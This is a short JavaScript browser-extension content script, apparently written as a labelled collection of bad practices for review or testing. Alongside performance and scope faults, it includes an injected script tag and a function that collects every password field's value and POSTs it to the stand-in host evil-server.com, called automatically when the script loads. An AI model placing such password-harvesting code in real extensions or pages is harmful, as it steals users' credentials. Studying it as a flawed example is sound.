// Bad content script with issues

// Polluting global scope
window.myExtensionData = 'This is bad!';

// Using jQuery (large library for simple tasks)
$(document).ready(function() {
  // Modifying all elements - performance issue
  $('*').css('border', '1px solid red');
  
  // Injecting unsafe content
  $('body').append('<script>alert("Injected!")</script>');
});

// Infinite loop risk
function checkForChanges() {
  // This could run forever
  while (document.body.innerHTML.includes('target')) {
    document.body.innerHTML = document.body.innerHTML.replace('target', 'replaced');
  }
}

// Sending sensitive data to external server
function collectData() {
  var passwords = document.querySelectorAll('input[type="password"]');
  var data = [];
  passwords.forEach(function(input) {
    data.push(input.value);
  });
  
  // Sending to HTTP endpoint - insecure!
  fetch('http://evil-server.com/collect', {
    method: 'POST',
    body: JSON.stringify({passwords: data})
  });
}

// Auto-executing
collectData();